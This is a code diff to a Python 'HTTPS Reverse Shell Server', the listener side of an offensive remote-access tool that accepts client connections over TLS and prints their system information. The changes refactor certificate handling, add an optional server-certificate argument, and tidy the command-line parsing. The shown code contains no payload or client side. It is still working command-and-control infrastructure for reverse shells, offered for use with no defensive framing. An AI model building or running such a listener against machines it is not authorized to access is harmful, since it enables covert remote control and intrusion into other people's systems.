@@ -43,7 +43,8 @@ class ShellHandler(BaseHTTPRequestHandler):
     def _open_session(self, session_info: list[str]) -> None:
         """Displays client system information on connection."""
         print("[>] Connection established")
-        info = {"Client address": ":".join(str(e) for e in self.client_address)}
+        host, port = self.client_address
+        info = {"Client address": f"{host}:{str(port)}"}
         info |= json.loads(session_info[0])
         for key, value in info.items():
             print("\t[+] {0:.<20} {1}".format(key, value).expandtabs(3))
@@ -78,12 +79,21 @@ class ShellHandler(BaseHTTPRequestHandler):
 
 
 class ShellServer:
-    def __init__(self, host: str, port: int):
+    def __init__(self,
+                 host: str,
+                 port: int, *,
+                 server_cert: [str, Path] = None):
         """Create a Reverse Shell Server that communicates with clients
-        through HTTPS."""
+        through HTTPS.
+
+        :param host: Server address or hostname.
+        :param port: Port number to bind the server to.
+        :param server_cert: Path to a file containing the server
+            certificate in PEM format.
+        """
         self.host = host
         self.port = port
-        self._ca = None
+        self.server_cert = server_cert
 
     @property
     def server_address(self) -> tuple[str, int]:
@@ -102,26 +112,24 @@ class ShellServer:
             return Path(__file__).parent.absolute()
 
     @property
-    def ca_cert(self) -> Path:
-        """Gets a valid path to a CA certificate file if it exists or
-        creates one for a new CA and then returns it."""
-        ca_cert = self.base_path.joinpath("ca.pem")
-        if not ca_cert.exists():  # Create CA certificate
-            self._ca = CA()
-            self._ca.cert_pem.write_to_path(str(ca_cert))
-        return ca_cert
-
-    @property
     def server_cert(self) -> Path:
-        """Gets a valid path to the server's certificate file if it
-        exists or creates a new certificate signed by the established
-        CA and then returns it."""
-        server_cert = self.base_path.joinpath("server.pem")
+        """
+        Gets a valid path to the server certificate file.
+        Sets the path to the server certificate or creates a new CA that
+        signs it and writes to a file.
+        """
+        return self._server_cert
+
+    @server_cert.setter
+    def server_cert(self, path: [str, Path]) -> None:
+        server_cert = self.base_path.joinpath("server.pem") if \
+            path is None else Path(path)
         if not server_cert.exists():  # Create server certificate
-            signed_cert = self._ca.issue_cert(self.host)
+            (ca := CA()).cert_pem.write_to_path("ca.pem")
+            signed_cert = ca.issue_cert(self.host)
             signed_cert.private_key_and_cert_chain_pem.write_to_path(
                 str(server_cert))
-        return server_cert
+        self._server_cert = server_cert
 
     def execute(self) -> None:
         with HTTPServer(self.server_address, ShellHandler) as httpd:
@@ -138,20 +146,34 @@ class ShellServer:
                 print("\n[!] Shutting down the server...")
 
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     import argparse
 
     parser = argparse.ArgumentParser(description="HTTPS Reverse Shell Server")
-    parser.add_argument("host",
-                        type=str,
-                        metavar="<hostname/address>",
-                        help="Server address or hostname.")
-    parser.add_argument("-p", "--port",
-                        type=int,
-                        required=True,
-                        metavar="<port>",
-                        help="Port number to bind the server to.")
+    parser.add_argument(
+        "host",
+        type=str,
+        metavar="<hostname/address>",
+        help="Server address or hostname."
+    )
+    parser.add_argument(
+        "port",
+        type=int,
+        metavar="<port>",
+        help="Port number to bind the server to."
+    )
+    parser.add_argument(
+        "--server-cert",
+        type=str,
+        metavar="<path>",
+        help="Path to a file containing the server certificate in PEM format. "
+             "Creates a development certificate for 'localhost' if unset."
+    )
 
     _args = parser.parse_args()
 
-    ShellServer(host=_args.host, port=_args.port).execute()
+    ShellServer(
+        host=_args.host,
+        port=_args.port,
+        server_cert=_args.server_cert
+    ).execute()
